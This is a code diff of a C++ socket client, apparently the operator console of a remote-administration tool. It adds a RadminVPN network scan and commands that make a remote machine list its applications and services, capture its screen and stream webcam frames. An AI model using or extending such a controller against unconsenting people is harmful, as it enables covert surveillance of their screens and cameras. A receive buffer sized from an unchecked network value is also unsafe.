@@ -4,7 +4,9 @@
 #include <string>
 #include <vector>
 #include <fstream>
-
+#include <stdexcept>
+#include "networkDiscovery.h"
+#include <chrono>
 #pragma comment(lib, "ws2_32.lib")
 
 std::vector<char> receiveImageData(SOCKET clientSocket) {
@@ -55,6 +57,12 @@ int main() {
         return 1;
     }
 
+    // Scan IP first
+    NetworkDiscovery initialDiscovery;
+    initialDiscovery.sendBroadcast();
+    initialDiscovery.listenForResponses(5);
+    // Scan IP first
+
     std::string serverIP;
     int serverPort;
 
@@ -80,8 +88,25 @@ int main() {
 
     while (true) {
         char sendBuffer[1024] = {};
-        std::cout << "Enter message (or 'exit' to quit): ";
+        std::cout << "Enter command:\n"
+                  << "1. list app - List applications\n"
+                  << "2. list service - List services\n"
+                  << "3. screen capture - Capture screen\n"
+                  << "4. start webcam - Start webcam\n"
+                  << "5. get webcam frame - Get current webcam frame\n"
+                  << "6. stop webcam - Stop webcam\n"
+                  << "7. exit - Quit\n"
+                  << "Command: ";
         std::cin.getline(sendBuffer, sizeof(sendBuffer));
+
+        // List RadminVPN devices
+        if (std::string(sendBuffer) == "list network") {
+            NetworkDiscovery networkDiscovery;
+            networkDiscovery.sendBroadcast();
+            networkDiscovery.listenForResponses(5);
+            continue;
+        }
+
         send(clientSocket, sendBuffer, strlen(sendBuffer), 0);
 
         if (strcmp(sendBuffer, "exit") == 0) {
@@ -90,7 +115,6 @@ int main() {
 
         // Receive response from server
         std::vector<char> receivedData;
-
         int bytesReceived;
         int expectedSize = 0;
 
@@ -100,10 +124,10 @@ int main() {
             std::cerr << "Failed to receive response size" << std::endl;
             continue;
         }
+
         char recvBuffer[expectedSize];
         // Now receive the actual response
         while (receivedData.size() < expectedSize) {
-
             bytesReceived = recv(clientSocket, recvBuffer, expectedSize, 0);
             if (bytesReceived > 0) {
                 receivedData.insert(receivedData.end(), recvBuffer, recvBuffer + bytesReceived);
@@ -121,12 +145,32 @@ int main() {
             std::cout << "Server response: " << std::endl << response << std::endl;
         }
 
-        if (strcmp(sendBuffer, "screen capture") == 0) {
+        // Handle image data for both screen capture and webcam
+        if (strcmp(sendBuffer, "screen capture") == 0 || strcmp(sendBuffer, "get webcam frame") == 0) {
             std::vector<char> imageData = receiveImageData(clientSocket);
-            std::ofstream outFile("screenshot.jpg", std::ios::binary);
-            outFile.write(imageData.data(), imageData.size());
-            outFile.close();
-            std::cout << "Screenshot saved as screenshot.jpg" << std::endl;
+            if (!imageData.empty()) {
+                std::string filename;
+                if (strcmp(sendBuffer, "screen capture") == 0) {
+                    filename = "screenshot.jpg";
+                } else {
+                    // Create filename with timestamp for webcam frames
+                    auto now = std::chrono::system_clock::now();
+                    auto now_c = std::chrono::system_clock::to_time_t(now);
+                    char timestamp[20];
+                    strftime(timestamp, sizeof(timestamp), "%Y%m%d_%H%M%S", localtime(&now_c));
+                    filename = "webcam_" + std::string(timestamp) + ".jpg";
+                }
+
+                std::ofstream outFile(filename, std::ios::binary);
+                outFile.write(imageData.data(), imageData.size());
+                outFile.close();
+                std::cout << "Image saved as " << filename << std::endl;
+            }
+        }
+
+        // If webcam is started, you can automatically request frames
+        if (strcmp(sendBuffer, "start webcam") == 0) {
+            std::cout << "Webcam started. Use 'get webcam frame' to capture frames.\n";
         }
     }
 
